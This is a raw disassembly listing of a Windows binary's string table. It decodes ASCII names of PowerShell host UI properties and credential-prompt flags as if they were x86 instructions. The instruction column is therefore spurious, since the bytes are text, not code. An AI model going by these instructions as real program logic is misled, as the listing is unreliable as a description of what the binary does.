  4073d0:	00 70 73             	add    %dh,0x73(%eax)
  4073d3:	7a 43                	jp     0x407418
  4073d5:	61                   	popa
  4073d6:	70 74                	jo     0x40744c
  4073d8:	69 6f 6e 54 65 78 74 	imul   $0x74786554,0x6e(%edi),%ebp
  4073df:	00 68 62             	add    %ch,0x62(%eax)
  4073e2:	6d                   	insl   (%dx),%es:(%edi)
  4073e3:	42                   	inc    %edx
  4073e4:	61                   	popa
  4073e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4073e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4073e7:	65 72 00             	gs jb  0x4073ea
  4073ea:	76 61                	jbe    0x40744d
  4073ec:	6c                   	insb   (%dx),%es:(%edi)
  4073ed:	75 65                	jne    0x407454
  4073ef:	5f                   	pop    %edi
  4073f0:	5f                   	pop    %edi
  4073f1:	00 49 4e             	add    %cl,0x4e(%ecx)
  4073f4:	43                   	inc    %ebx
  4073f5:	4f                   	dec    %edi
  4073f6:	52                   	push   %edx
  4073f7:	52                   	push   %edx
  4073f8:	45                   	inc    %ebp
  4073f9:	43                   	inc    %ebx
  4073fa:	54                   	push   %esp
  4073fb:	5f                   	pop    %edi
  4073fc:	50                   	push   %eax
  4073fd:	41                   	inc    %ecx
  4073fe:	53                   	push   %ebx
  4073ff:	53                   	push   %ebx
  407400:	57                   	push   %edi
  407401:	4f                   	dec    %edi
  407402:	52                   	push   %edx
  407403:	44                   	inc    %esp
  407404:	00 44 4f 5f          	add    %al,0x5f(%edi,%ecx,2)
  407408:	4e                   	dec    %esi
  407409:	4f                   	dec    %edi
  40740a:	54                   	push   %esp
  40740b:	5f                   	pop    %edi
  40740c:	50                   	push   %eax
  40740d:	45                   	inc    %ebp
  40740e:	52                   	push   %edx
  40740f:	53                   	push   %ebx
  407410:	49                   	dec    %ecx
  407411:	53                   	push   %ebx
  407412:	54                   	push   %esp
  407413:	00 52 45             	add    %dl,0x45(%edx)
  407416:	51                   	push   %ecx
  407417:	55                   	push   %ebp
  407418:	45                   	inc    %ebp
  407419:	53                   	push   %ebx
  40741a:	54                   	push   %esp
  40741b:	5f                   	pop    %edi
  40741c:	41                   	inc    %ecx
  40741d:	44                   	inc    %esp
  40741e:	4d                   	dec    %ebp
  40741f:	49                   	dec    %ecx
  407420:	4e                   	dec    %esi
  407421:	49                   	dec    %ecx
  407422:	53                   	push   %ebx
  407423:	54                   	push   %esp
  407424:	52                   	push   %edx
  407425:	41                   	inc    %ecx
  407426:	54                   	push   %esp
  407427:	4f                   	dec    %edi
  407428:	52                   	push   %edx
  407429:	00 45 58             	add    %al,0x58(%ebp)
  40742c:	43                   	inc    %ebx
  40742d:	4c                   	dec    %esp
  40742e:	55                   	push   %ebp
  40742f:	44                   	inc    %esp
  407430:	45                   	inc    %ebp
  407431:	5f                   	pop    %edi
  407432:	43                   	inc    %ebx
  407433:	45                   	inc    %ebp
  407434:	52                   	push   %edx
  407435:	54                   	push   %esp
  407436:	49                   	dec    %ecx
  407437:	46                   	inc    %esi
  407438:	49                   	dec    %ecx
  407439:	43                   	inc    %ebx
  40743a:	41                   	inc    %ecx
  40743b:	54                   	push   %esp
  40743c:	45                   	inc    %ebp
  40743d:	53                   	push   %ebx
  40743e:	00 52 45             	add    %dl,0x45(%edx)
  407441:	51                   	push   %ecx
  407442:	55                   	push   %ebp
  407443:	49                   	dec    %ecx
  407444:	52                   	push   %edx
  407445:	45                   	inc    %ebp
  407446:	5f                   	pop    %edi
  407447:	43                   	inc    %ebx
  407448:	45                   	inc    %ebp
  407449:	52                   	push   %edx
  40744a:	54                   	push   %esp
  40744b:	49                   	dec    %ecx
  40744c:	46                   	inc    %esi
  40744d:	49                   	dec    %ecx
  40744e:	43                   	inc    %ebx
  40744f:	41                   	inc    %ecx
  407450:	54                   	push   %esp
  407451:	45                   	inc    %ebp
  407452:	00 53 48             	add    %dl,0x48(%ebx)
  407455:	4f                   	dec    %edi
  407456:	57                   	push   %edi
  407457:	5f                   	pop    %edi
  407458:	53                   	push   %ebx
  407459:	41                   	inc    %ecx
  40745a:	56                   	push   %esi
  40745b:	45                   	inc    %ebp
  40745c:	5f                   	pop    %edi
  40745d:	43                   	inc    %ebx
  40745e:	48                   	dec    %eax
  40745f:	45                   	inc    %ebp
  407460:	43                   	inc    %ebx
  407461:	4b                   	dec    %ebx
  407462:	5f                   	pop    %edi
  407463:	42                   	inc    %edx
  407464:	4f                   	dec    %edi
  407465:	58                   	pop    %eax
  407466:	00 41 4c             	add    %al,0x4c(%ecx)
  407469:	57                   	push   %edi
  40746a:	41                   	inc    %ecx
  40746b:	59                   	pop    %ecx
  40746c:	53                   	push   %ebx
  40746d:	5f                   	pop    %edi
  40746e:	53                   	push   %ebx
  40746f:	48                   	dec    %eax
  407470:	4f                   	dec    %edi
  407471:	57                   	push   %edi
  407472:	5f                   	pop    %edi
  407473:	55                   	push   %ebp
  407474:	49                   	dec    %ecx
  407475:	00 52 45             	add    %dl,0x45(%edx)
  407478:	51                   	push   %ecx
  407479:	55                   	push   %ebp
  40747a:	49                   	dec    %ecx
  40747b:	52                   	push   %edx
  40747c:	45                   	inc    %ebp
  40747d:	5f                   	pop    %edi
  40747e:	53                   	push   %ebx
  40747f:	4d                   	dec    %ebp
  407480:	41                   	inc    %ecx
  407481:	52                   	push   %edx
  407482:	54                   	push   %esp
  407483:	43                   	inc    %ebx
  407484:	41                   	inc    %ecx
  407485:	52                   	push   %edx
  407486:	44                   	inc    %esp
  407487:	00 50 41             	add    %dl,0x41(%eax)
  40748a:	53                   	push   %ebx
  40748b:	53                   	push   %ebx
  40748c:	57                   	push   %edi
  40748d:	4f                   	dec    %edi
  40748e:	52                   	push   %edx
  40748f:	44                   	inc    %esp
  407490:	5f                   	pop    %edi
  407491:	4f                   	dec    %edi
  407492:	4e                   	dec    %esi
  407493:	4c                   	dec    %esp
  407494:	59                   	pop    %ecx
  407495:	5f                   	pop    %edi
  407496:	4f                   	dec    %edi
  407497:	4b                   	dec    %ebx
  407498:	00 56 41             	add    %dl,0x41(%esi)
  40749b:	4c                   	dec    %esp
  40749c:	49                   	dec    %ecx
  40749d:	44                   	inc    %esp
  40749e:	41                   	inc    %ecx
  40749f:	54                   	push   %esp
  4074a0:	45                   	inc    %ebp
  4074a1:	5f                   	pop    %edi
  4074a2:	55                   	push   %ebp
  4074a3:	53                   	push   %ebx
  4074a4:	45                   	inc    %ebp
  4074a5:	52                   	push   %edx
  4074a6:	4e                   	dec    %esi
  4074a7:	41                   	inc    %ecx
  4074a8:	4d                   	dec    %ebp
  4074a9:	45                   	inc    %ebp
  4074aa:	00 43 4f             	add    %al,0x4f(%ebx)
  4074ad:	4d                   	dec    %ebp
  4074ae:	50                   	push   %eax
  4074af:	4c                   	dec    %esp
  4074b0:	45                   	inc    %ebp
  4074b1:	54                   	push   %esp
  4074b2:	45                   	inc    %ebp
  4074b3:	5f                   	pop    %edi
  4074b4:	55                   	push   %ebp
  4074b5:	53                   	push   %ebx
  4074b6:	45                   	inc    %ebp
  4074b7:	52                   	push   %edx
  4074b8:	4e                   	dec    %esi
  4074b9:	41                   	inc    %ecx
  4074ba:	4d                   	dec    %ebp
  4074bb:	45                   	inc    %ebp
  4074bc:	00 50 45             	add    %dl,0x45(%eax)
  4074bf:	52                   	push   %edx
  4074c0:	53                   	push   %ebx
  4074c1:	49                   	dec    %ecx
  4074c2:	53                   	push   %ebx
  4074c3:	54                   	push   %esp
  4074c4:	00 53 45             	add    %dl,0x45(%ebx)
  4074c7:	52                   	push   %edx
  4074c8:	56                   	push   %esi
  4074c9:	45                   	inc    %ebp
  4074ca:	52                   	push   %edx
  4074cb:	5f                   	pop    %edi
  4074cc:	43                   	inc    %ebx
  4074cd:	52                   	push   %edx
  4074ce:	45                   	inc    %ebp
  4074cf:	44                   	inc    %esp
  4074d0:	45                   	inc    %ebp
  4074d1:	4e                   	dec    %esi
  4074d2:	54                   	push   %esp
  4074d3:	49                   	dec    %ecx
  4074d4:	41                   	inc    %ecx
  4074d5:	4c                   	dec    %esp
  4074d6:	00 45 58             	add    %al,0x58(%ebp)
  4074d9:	50                   	push   %eax
  4074da:	45                   	inc    %ebp
  4074db:	43                   	inc    %ebx
  4074dc:	54                   	push   %esp
  4074dd:	5f                   	pop    %edi
  4074de:	43                   	inc    %ebx
  4074df:	4f                   	dec    %edi
  4074e0:	4e                   	dec    %esi
  4074e1:	46                   	inc    %esi
  4074e2:	49                   	dec    %ecx
  4074e3:	52                   	push   %edx
  4074e4:	4d                   	dec    %ebp
  4074e5:	41                   	inc    %ecx
  4074e6:	54                   	push   %esp
  4074e7:	49                   	dec    %ecx
  4074e8:	4f                   	dec    %edi
  4074e9:	4e                   	dec    %esi
  4074ea:	00 47 45             	add    %al,0x45(%edi)
  4074ed:	4e                   	dec    %esi
  4074ee:	45                   	inc    %ebp
  4074ef:	52                   	push   %edx
  4074f0:	49                   	dec    %ecx
  4074f1:	43                   	inc    %ebx
  4074f2:	5f                   	pop    %edi
  4074f3:	43                   	inc    %ebx
  4074f4:	52                   	push   %edx
  4074f5:	45                   	inc    %ebp
  4074f6:	44                   	inc    %esp
  4074f7:	45                   	inc    %ebp
  4074f8:	4e                   	dec    %esi
  4074f9:	54                   	push   %esp
  4074fa:	49                   	dec    %ecx
  4074fb:	41                   	inc    %ecx
  4074fc:	4c                   	dec    %esp
  4074fd:	53                   	push   %ebx
  4074fe:	00 55 53             	add    %dl,0x53(%ebp)
  407501:	45                   	inc    %ebp
  407502:	52                   	push   %edx
  407503:	4e                   	dec    %esi
  407504:	41                   	inc    %ecx
  407505:	4d                   	dec    %ebp
  407506:	45                   	inc    %ebp
  407507:	5f                   	pop    %edi
  407508:	54                   	push   %esp
  407509:	41                   	inc    %ecx
  40750a:	52                   	push   %edx
  40750b:	47                   	inc    %edi
  40750c:	45                   	inc    %ebp
  40750d:	54                   	push   %esp
  40750e:	5f                   	pop    %edi
  40750f:	43                   	inc    %ebx
  407510:	52                   	push   %edx
  407511:	45                   	inc    %ebp
  407512:	44                   	inc    %esp
  407513:	45                   	inc    %ebp
  407514:	4e                   	dec    %esi
  407515:	54                   	push   %esp
  407516:	49                   	dec    %ecx
  407517:	41                   	inc    %ecx
  407518:	4c                   	dec    %esp
  407519:	53                   	push   %ebx
  40751a:	00 4b 45             	add    %cl,0x45(%ebx)
  40751d:	45                   	inc    %ebp
  40751e:	50                   	push   %eax
  40751f:	5f                   	pop    %edi
  407520:	55                   	push   %ebp
  407521:	53                   	push   %ebx
  407522:	45                   	inc    %ebp
  407523:	52                   	push   %edx
  407524:	4e                   	dec    %esi
  407525:	41                   	inc    %ecx
  407526:	4d                   	dec    %ebp
  407527:	45                   	inc    %ebp
  407528:	00 4e 4f             	add    %cl,0x4f(%esi)
  40752b:	5f                   	pop    %edi
  40752c:	45                   	inc    %ebp
  40752d:	52                   	push   %edx
  40752e:	52                   	push   %edx
  40752f:	4f                   	dec    %edi
  407530:	52                   	push   %edx
  407531:	00 45 52             	add    %al,0x52(%ebp)
  407534:	52                   	push   %edx
  407535:	4f                   	dec    %edi
  407536:	52                   	push   %edx
  407537:	5f                   	pop    %edi
  407538:	43                   	inc    %ebx
  407539:	41                   	inc    %ecx
  40753a:	4e                   	dec    %esi
  40753b:	43                   	inc    %ebx
  40753c:	45                   	inc    %ebp
  40753d:	4c                   	dec    %esp
  40753e:	4c                   	dec    %esp
  40753f:	45                   	inc    %ebp
  407540:	44                   	inc    %esp
  407541:	00 45 52             	add    %al,0x52(%ebp)
  407544:	52                   	push   %edx
  407545:	4f                   	dec    %edi
  407546:	52                   	push   %edx
  407547:	5f                   	pop    %edi
  407548:	4e                   	dec    %esi
  407549:	4f                   	dec    %edi
  40754a:	5f                   	pop    %edi
  40754b:	53                   	push   %ebx
  40754c:	55                   	push   %ebp
  40754d:	43                   	inc    %ebx
  40754e:	48                   	dec    %eax
  40754f:	5f                   	pop    %edi
  407550:	4c                   	dec    %esp
  407551:	4f                   	dec    %edi
  407552:	47                   	inc    %edi
  407553:	4f                   	dec    %edi
  407554:	4e                   	dec    %esi
  407555:	5f                   	pop    %edi
  407556:	53                   	push   %ebx
  407557:	45                   	inc    %ebp
  407558:	53                   	push   %ebx
  407559:	53                   	push   %ebx
  40755a:	49                   	dec    %ecx
  40755b:	4f                   	dec    %edi
  40755c:	4e                   	dec    %esi
  40755d:	00 45 52             	add    %al,0x52(%ebp)
  407560:	52                   	push   %edx
  407561:	4f                   	dec    %edi
  407562:	52                   	push   %edx
  407563:	5f                   	pop    %edi
  407564:	4e                   	dec    %esi
  407565:	4f                   	dec    %edi
  407566:	54                   	push   %esp
  407567:	5f                   	pop    %edi
  407568:	46                   	inc    %esi
  407569:	4f                   	dec    %edi
  40756a:	55                   	push   %ebp
  40756b:	4e                   	dec    %esi
  40756c:	44                   	inc    %esp
  40756d:	00 45 52             	add    %al,0x52(%ebp)
  407570:	52                   	push   %edx
  407571:	4f                   	dec    %edi
  407572:	52                   	push   %edx
  407573:	5f                   	pop    %edi
  407574:	49                   	dec    %ecx
  407575:	4e                   	dec    %esi
  407576:	56                   	push   %esi
  407577:	41                   	inc    %ecx
  407578:	4c                   	dec    %esp
  407579:	49                   	dec    %ecx
  40757a:	44                   	inc    %esp
  40757b:	5f                   	pop    %edi
  40757c:	41                   	inc    %ecx
  40757d:	43                   	inc    %ebx
  40757e:	43                   	inc    %ebx
  40757f:	4f                   	dec    %edi
  407580:	55                   	push   %ebp
  407581:	4e                   	dec    %esi
  407582:	54                   	push   %esp
  407583:	5f                   	pop    %edi
  407584:	4e                   	dec    %esi
  407585:	41                   	inc    %ecx
  407586:	4d                   	dec    %ebp
  407587:	45                   	inc    %ebp
  407588:	00 45 52             	add    %al,0x52(%ebp)
  40758b:	52                   	push   %edx
  40758c:	4f                   	dec    %edi
  40758d:	52                   	push   %edx
  40758e:	5f                   	pop    %edi
  40758f:	49                   	dec    %ecx
  407590:	4e                   	dec    %esi
  407591:	53                   	push   %ebx
  407592:	55                   	push   %ebp
  407593:	46                   	inc    %esi
  407594:	46                   	inc    %esi
  407595:	49                   	dec    %ecx
  407596:	43                   	inc    %ebx
  407597:	49                   	dec    %ecx
  407598:	45                   	inc    %ebp
  407599:	4e                   	dec    %esi
  40759a:	54                   	push   %esp
  40759b:	5f                   	pop    %edi
  40759c:	42                   	inc    %edx
  40759d:	55                   	push   %ebp
  40759e:	46                   	inc    %esi
  40759f:	46                   	inc    %esi
  4075a0:	45                   	inc    %ebp
  4075a1:	52                   	push   %edx
  4075a2:	00 45 52             	add    %al,0x52(%ebp)
  4075a5:	52                   	push   %edx
  4075a6:	4f                   	dec    %edi
  4075a7:	52                   	push   %edx
  4075a8:	5f                   	pop    %edi
  4075a9:	49                   	dec    %ecx
  4075aa:	4e                   	dec    %esi
  4075ab:	56                   	push   %esi
  4075ac:	41                   	inc    %ecx
  4075ad:	4c                   	dec    %esp
  4075ae:	49                   	dec    %ecx
  4075af:	44                   	inc    %esp
  4075b0:	5f                   	pop    %edi
  4075b1:	50                   	push   %eax
  4075b2:	41                   	inc    %ecx
  4075b3:	52                   	push   %edx
  4075b4:	41                   	inc    %ecx
  4075b5:	4d                   	dec    %ebp
  4075b6:	45                   	inc    %ebp
  4075b7:	54                   	push   %esp
  4075b8:	45                   	inc    %ebp
  4075b9:	52                   	push   %edx
  4075ba:	00 45 52             	add    %al,0x52(%ebp)
  4075bd:	52                   	push   %edx
  4075be:	4f                   	dec    %edi
  4075bf:	52                   	push   %edx
  4075c0:	5f                   	pop    %edi
  4075c1:	49                   	dec    %ecx
  4075c2:	4e                   	dec    %esi
  4075c3:	56                   	push   %esi
  4075c4:	41                   	inc    %ecx
  4075c5:	4c                   	dec    %esp
  4075c6:	49                   	dec    %ecx
  4075c7:	44                   	inc    %esp
  4075c8:	5f                   	pop    %edi
  4075c9:	46                   	inc    %esi
  4075ca:	4c                   	dec    %esp
  4075cb:	41                   	inc    %ecx
  4075cc:	47                   	inc    %edi
  4075cd:	53                   	push   %ebx
  4075ce:	00 55 73             	add    %dl,0x73(%ebp)
  4075d1:	65 72 00             	gs jb  0x4075d4
  4075d4:	50                   	push   %eax
  4075d5:	61                   	popa
  4075d6:	73 73                	jae    0x40764b
  4075d8:	77 6f                	ja     0x407649
  4075da:	72 64                	jb     0x407640
  4075dc:	00 44 6f 6d          	add    %al,0x6d(%edi,%ebp,2)
  4075e0:	61                   	popa
  4075e1:	69 6e 00 43 6f 6e 73 	imul   $0x736e6f43,0x0(%esi),%ebp
  4075e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4075e9:	6c                   	insb   (%dx),%es:(%edi)
  4075ea:	65 43                	gs inc %ebx
  4075ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ed:	6c                   	insb   (%dx),%es:(%edi)
  4075ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4075ef:	72 00                	jb     0x4075f1
  4075f1:	47                   	inc    %edi
  4075f2:	55                   	push   %ebp
  4075f3:	49                   	dec    %ecx
  4075f4:	42                   	inc    %edx
  4075f5:	61                   	popa
  4075f6:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  4075f9:	72 6f                	jb     0x40766a
  4075fb:	75 6e                	jne    0x40766b
  4075fd:	64 43                	fs inc %ebx
  4075ff:	6f                   	outsl  %ds:(%esi),(%dx)
  407600:	6c                   	insb   (%dx),%es:(%edi)
  407601:	6f                   	outsl  %ds:(%esi),(%dx)
  407602:	72 00                	jb     0x407604
  407604:	47                   	inc    %edi
  407605:	55                   	push   %ebp
  407606:	49                   	dec    %ecx
  407607:	46                   	inc    %esi
  407608:	6f                   	outsl  %ds:(%esi),(%dx)
  407609:	72 65                	jb     0x407670
  40760b:	67 72 6f             	addr16 jb 0x40767d
  40760e:	75 6e                	jne    0x40767e
  407610:	64 43                	fs inc %ebx
  407612:	6f                   	outsl  %ds:(%esi),(%dx)
  407613:	6c                   	insb   (%dx),%es:(%edi)
  407614:	6f                   	outsl  %ds:(%esi),(%dx)
  407615:	72 00                	jb     0x407617
  407617:	67 65 74 5f          	addr16 gs je 0x40767a
  40761b:	42                   	inc    %edx
  40761c:	61                   	popa
  40761d:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407620:	72 6f                	jb     0x407691
  407622:	75 6e                	jne    0x407692
  407624:	64 43                	fs inc %ebx
  407626:	6f                   	outsl  %ds:(%esi),(%dx)
  407627:	6c                   	insb   (%dx),%es:(%edi)
  407628:	6f                   	outsl  %ds:(%esi),(%dx)
  407629:	72 00                	jb     0x40762b
  40762b:	73 65                	jae    0x407692
  40762d:	74 5f                	je     0x40768e
  40762f:	42                   	inc    %edx
  407630:	61                   	popa
  407631:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407634:	72 6f                	jb     0x4076a5
  407636:	75 6e                	jne    0x4076a6
  407638:	64 43                	fs inc %ebx
  40763a:	6f                   	outsl  %ds:(%esi),(%dx)
  40763b:	6c                   	insb   (%dx),%es:(%edi)
  40763c:	6f                   	outsl  %ds:(%esi),(%dx)
  40763d:	72 00                	jb     0x40763f
  40763f:	53                   	push   %ebx
  407640:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407647:	5f                   	pop    %edi
  407648:	42                   	inc    %edx
  407649:	75 66                	jne    0x4076b1
  40764b:	66 65 72 53          	data16 gs jb 0x4076a2
  40764f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407656:	5f                   	pop    %edi
  407657:	42                   	inc    %edx
  407658:	75 66                	jne    0x4076c0
  40765a:	66 65 72 53          	data16 gs jb 0x4076b1
  40765e:	69 7a 65 00 43 6f 6f 	imul   $0x6f6f4300,0x65(%edx),%edi
  407665:	72 64                	jb     0x4076cb
  407667:	69 6e 61 74 65 73 00 	imul   $0x736574,0x61(%esi),%ebp
  40766e:	67 65 74 5f          	addr16 gs je 0x4076d1
  407672:	43                   	inc    %ebx
  407673:	75 72                	jne    0x4076e7
  407675:	73 6f                	jae    0x4076e6
  407677:	72 50                	jb     0x4076c9
  407679:	6f                   	outsl  %ds:(%esi),(%dx)
  40767a:	73 69                	jae    0x4076e5
  40767c:	74 69                	je     0x4076e7
  40767e:	6f                   	outsl  %ds:(%esi),(%dx)
  40767f:	6e                   	outsb  %ds:(%esi),(%dx)
  407680:	00 73 65             	add    %dh,0x65(%ebx)
  407683:	74 5f                	je     0x4076e4
  407685:	43                   	inc    %ebx
  407686:	75 72                	jne    0x4076fa
  407688:	73 6f                	jae    0x4076f9
  40768a:	72 50                	jb     0x4076dc
  40768c:	6f                   	outsl  %ds:(%esi),(%dx)
  40768d:	73 69                	jae    0x4076f8
  40768f:	74 69                	je     0x4076fa
  407691:	6f                   	outsl  %ds:(%esi),(%dx)
  407692:	6e                   	outsb  %ds:(%esi),(%dx)
  407693:	00 67 65             	add    %ah,0x65(%edi)
  407696:	74 5f                	je     0x4076f7
  407698:	43                   	inc    %ebx
  407699:	75 72                	jne    0x40770d
  40769b:	73 6f                	jae    0x40770c
  40769d:	72 53                	jb     0x4076f2
  40769f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  4076a6:	5f                   	pop    %edi
  4076a7:	43                   	inc    %ebx
  4076a8:	75 72                	jne    0x40771c
  4076aa:	73 6f                	jae    0x40771b
  4076ac:	72 53                	jb     0x407701
  4076ae:	69 7a 65 00 49 6e 76 	imul   $0x766e4900,0x65(%edx),%edi
  4076b5:	69 73 69 62 6c 65 5f 	imul   $0x5f656c62,0x69(%ebx),%esi
  4076bc:	46                   	inc    %esi
  4076bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4076be:	72 6d                	jb     0x40772d
  4076c0:	00 46 6c             	add    %al,0x6c(%esi)
  4076c3:	75 73                	jne    0x407738
  4076c5:	68 49 6e 70 75       	push   $0x75706e49
  4076ca:	74 42                	je     0x40770e
  4076cc:	75 66                	jne    0x407734
  4076ce:	66 65 72 00          	data16 gs jb 0x4076d2
  4076d2:	67 65 74 5f          	addr16 gs je 0x407735
  4076d6:	46                   	inc    %esi
  4076d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4076d8:	72 65                	jb     0x40773f
  4076da:	67 72 6f             	addr16 jb 0x40774c
  4076dd:	75 6e                	jne    0x40774d
  4076df:	64 43                	fs inc %ebx
  4076e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e2:	6c                   	insb   (%dx),%es:(%edi)
  4076e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4076e4:	72 00                	jb     0x4076e6
  4076e6:	73 65                	jae    0x40774d
  4076e8:	74 5f                	je     0x407749
  4076ea:	46                   	inc    %esi
  4076eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4076ec:	72 65                	jb     0x407753
  4076ee:	67 72 6f             	addr16 jb 0x407760
  4076f1:	75 6e                	jne    0x407761
  4076f3:	64 43                	fs inc %ebx
  4076f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f6:	6c                   	insb   (%dx),%es:(%edi)
  4076f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4076f8:	72 00                	jb     0x4076fa
  4076fa:	42                   	inc    %edx
  4076fb:	75 66                	jne    0x407763
  4076fd:	66 65 72 43          	data16 gs jb 0x407744
  407701:	65 6c                	gs insb (%dx),%es:(%edi)
  407703:	6c                   	insb   (%dx),%es:(%edi)
  407704:	00 52 65             	add    %dl,0x65(%edx)
  407707:	63 74 61 6e          	arpl   %esi,0x6e(%ecx,%eiz,2)
  40770b:	67 6c                	insb   (%dx),%es:(%di)
  40770d:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407711:	74 42                	je     0x407755
  407713:	75 66                	jne    0x40777b
  407715:	66 65 72 43          	data16 gs jb 0x40775c
  407719:	6f                   	outsl  %ds:(%esi),(%dx)
  40771a:	6e                   	outsb  %ds:(%esi),(%dx)
  40771b:	74 65                	je     0x407782
  40771d:	6e                   	outsb  %ds:(%esi),(%dx)
  40771e:	74 73                	je     0x407793
  407720:	00 67 65             	add    %ah,0x65(%edi)
  407723:	74 5f                	je     0x407784
  407725:	4b                   	dec    %ebx
  407726:	65 79 41             	gs jns 0x40776a
  407729:	76 61                	jbe    0x40778c
  40772b:	69 6c 61 62 6c 65 00 	imul   $0x6700656c,0x62(%ecx,%eiz,2),%ebp
  407732:	67 
  407733:	65 74 5f             	gs je  0x407795
  407736:	4d                   	dec    %ebp
  407737:	61                   	popa
  407738:	78 50                	js     0x40778a
  40773a:	68 79 73 69 63       	push   $0x63697379
  40773f:	61                   	popa
  407740:	6c                   	insb   (%dx),%es:(%edi)
  407741:	57                   	push   %edi
  407742:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  407749:	7a 65                	jp     0x4077b0
  40774b:	00 67 65             	add    %ah,0x65(%edi)
  40774e:	74 5f                	je     0x4077af
  407750:	4d                   	dec    %ebp
  407751:	61                   	popa
  407752:	78 57                	js     0x4077ab
  407754:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  40775b:	7a 65                	jp     0x4077c2
  40775d:	00 4b 65             	add    %cl,0x65(%ebx)
  407760:	79 49                	jns    0x4077ab
  407762:	6e                   	outsb  %ds:(%esi),(%dx)
  407763:	66 6f                	outsw  %ds:(%esi),(%dx)
  407765:	00 52 65             	add    %dl,0x65(%edx)
  407768:	61                   	popa
  407769:	64 4b                	fs dec %ebx
  40776b:	65 79 4f             	gs jns 0x4077bd
  40776e:	70 74                	jo     0x4077e4
  407770:	69 6f 6e 73 00 52 65 	imul   $0x65520073,0x6e(%edi),%ebp
  407777:	61                   	popa
  407778:	64 4b                	fs dec %ebx
  40777a:	65 79 00             	gs jns 0x40777d
  40777d:	53                   	push   %ebx
  40777e:	63 72 6f             	arpl   %esi,0x6f(%edx)
  407781:	6c                   	insb   (%dx),%es:(%edi)
  407782:	6c                   	insb   (%dx),%es:(%edi)
  407783:	42                   	inc    %edx
  407784:	75 66                	jne    0x4077ec
  407786:	66 65 72 43          	data16 gs jb 0x4077cd
  40778a:	6f                   	outsl  %ds:(%esi),(%dx)
  40778b:	6e                   	outsb  %ds:(%esi),(%dx)
  40778c:	74 65                	je     0x4077f3
  40778e:	6e                   	outsb  %ds:(%esi),(%dx)
  40778f:	74 73                	je     0x407804
  407791:	00 53 65             	add    %dl,0x65(%ebx)
  407794:	74 42                	je     0x4077d8
  407796:	75 66                	jne    0x4077fe
  407798:	66 65 72 43          	data16 gs jb 0x4077df
  40779c:	6f                   	outsl  %ds:(%esi),(%dx)
  40779d:	6e                   	outsb  %ds:(%esi),(%dx)
  40779e:	74 65                	je     0x407805
  4077a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4077a1:	74 73                	je     0x407816
  4077a3:	00 67 65             	add    %ah,0x65(%edi)
  4077a6:	74 5f                	je     0x407807
  4077a8:	57                   	push   %edi
  4077a9:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4077b0:	73 69                	jae    0x40781b
  4077b2:	74 69                	je     0x40781d
  4077b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4077b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4077b6:	00 73 65             	add    %dh,0x65(%ebx)
  4077b9:	74 5f                	je     0x40781a
  4077bb:	57                   	push   %edi
  4077bc:	69 6e 64 6f 77 50 6f 	imul   $0x6f50776f,0x64(%esi),%ebp
  4077c3:	73 69                	jae    0x40782e
  4077c5:	74 69                	je     0x407830
  4077c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4077c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4077c9:	00 67 65             	add    %ah,0x65(%edi)
  4077cc:	74 5f                	je     0x40782d
  4077ce:	57                   	push   %edi
  4077cf:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  4077d6:	7a 65                	jp     0x40783d
  4077d8:	00 73 65             	add    %dh,0x65(%ebx)
  4077db:	74 5f                	je     0x40783c
  4077dd:	57                   	push   %edi
  4077de:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  4077e5:	7a 65                	jp     0x40784c
  4077e7:	00 67 65             	add    %ah,0x65(%edi)
  4077ea:	74 5f                	je     0x40784b
  4077ec:	57                   	push   %edi
  4077ed:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  4077f4:	74 6c                	je     0x407862
  4077f6:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4077fa:	74 5f                	je     0x40785b
  4077fc:	57                   	push   %edi
  4077fd:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407804:	74 6c                	je     0x407872
  407806:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  40780a:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  40780d:	72 6f                	jb     0x40787e
  40780f:	75 6e                	jne    0x40787f
  407811:	64 43                	fs inc %ebx
  407813:	6f                   	outsl  %ds:(%esi),(%dx)
  407814:	6c                   	insb   (%dx),%es:(%edi)
  407815:	6f                   	outsl  %ds:(%esi),(%dx)
  407816:	72 00                	jb     0x407818
  407818:	42                   	inc    %edx
  407819:	75 66                	jne    0x407881
  40781b:	66 65 72 53          	data16 gs jb 0x407872
  40781f:	69 7a 65 00 43 75 72 	imul   $0x72754300,0x65(%edx),%edi
  407826:	73 6f                	jae    0x407897
  407828:	72 50                	jb     0x40787a
  40782a:	6f                   	outsl  %ds:(%esi),(%dx)
  40782b:	73 69                	jae    0x407896
  40782d:	74 69                	je     0x407898
  40782f:	6f                   	outsl  %ds:(%esi),(%dx)
  407830:	6e                   	outsb  %ds:(%esi),(%dx)
